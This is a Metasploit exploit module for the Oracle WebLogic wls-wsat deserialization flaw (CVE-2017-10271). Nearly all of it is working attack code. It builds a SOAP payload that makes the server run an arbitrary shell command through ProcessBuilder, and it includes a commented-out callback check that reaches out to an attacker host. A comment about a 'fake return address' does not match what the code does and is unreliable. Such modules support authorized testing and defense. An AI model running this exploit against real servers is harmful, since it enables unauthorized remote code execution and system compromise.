##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Oracle WebLogic wls-wsat Component Deserialization RCE',
        'Description'    => %q(
            The Oracle WebLogic WLS WSAT Component is vulnerable to a XML Deserialization
        remote code execution vulnerability. Supported versions that are affected are
        10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Discovered by Alexey Tyurin
        of ERPScan and Federico Dotta of Media Service.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Kevin Kirsche <d3c3pt10n[AT]deceiveyour.team>', # Metasploit module
          'Luffin', # Proof of Concept
          'Alexey Tyurin', 'Federico Dotta' # Vulnerability Discovery
        ],
        'References'     =>
          [
            [ 'URL', 'https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html'],
            [ 'POC', 'https://github.com/Luffin/CVE-2017-10271'],
            [ 'Standalone Exploit', 'https://github.com/kkirsche/CVE-2017-10271'],
            [ 'CVE', '2017-10271']
          ],
        'Platform'      => %w{ win unix },
        'Arch'          => [ ARCH_CMD ],
        'Targets'        =>
          [
            [ 'Windows Command payload', { 'Arch' => ARCH_CMD, 'Platform' => 'win' } ],
            [ 'Unix Command payload', { 'Arch' => ARCH_CMD, 'Platform' => 'unix' } ]
          ],
        'DisclosureDate' => "Oct 19 2017",
        # Note that this is by index, rather than name. It's generally easiest
        # just to put the default at the beginning of the list and skip this
        # entirely.
        'DefaultTarget'  => 0
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to the WebLogic WSAT endpoint', '/wls-wsat/CoordinatorPortType']),
      OptInt.new('RPORT', [true, "The remote port that the WebLogic WSAT endpoint listens on", 7001]),
      OptInt.new('TIMEOUT', [true, "The timeout value of requests to RHOST", 20])
    ])
  end

  def cmd_base
    if target_platform == 'win'
      return 'cmd'
    else
      return '/bin/sh'
    end
  end

  def cmd_opt
    if target_platform == 'win'
      return '/c'
    else
      return '-c'
    end
  end

  def process_builder_payload
    # Generate a payload which will execute on a *nix machine using /bin/sh
    xml = %Q{<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>#{cmd_base}</string>
            </void>
            <void index="1">
              <string>#{cmd_opt}</string>
            </void>
            <void index="2">
              <string>#{payload.encoded.encode(xml: :text)}</string>
            </void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>}
  end

# Not sure how to catch the response, so I'll leave this here in case someone can help
# This payload is used by sending to the RHOST and then you will receive an HTTP request
# back from the target. If you got a request, it's vulnerable. If you didn't, it's not.
#   def http_check_payload
#     xml = %Q{<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
#   <soapenv:Header>
#     <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
#       <java version="1.8" class="java.beans.XMLDecoder">
#         <object id="url" class="java.net.URL">
#           <string>http://#{datastore['LHOST']}:#{datastore['LPORT']}/#{random_uri}</string>
#         </object>
#         <object idref="url">
#           <void id="stream" method = "openStream" />
#         </object>
#       </java>
#     </work:WorkContext>
#     </soapenv:Header>
#   <soapenv:Body/>
# </soapenv:Envelope>}
#   end

  #
  # The exploit method connects to the remote service and sends 1024 random bytes
  # followed by the fake return address and then the payload.
  #
  def exploit
    xml_payload = process_builder_payload

    send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path),
      'data'     => xml_payload,
      'ctype'    => 'text/xml;charset=UTF-8'
    }, datastore['TIMEOUT'])
  end
end
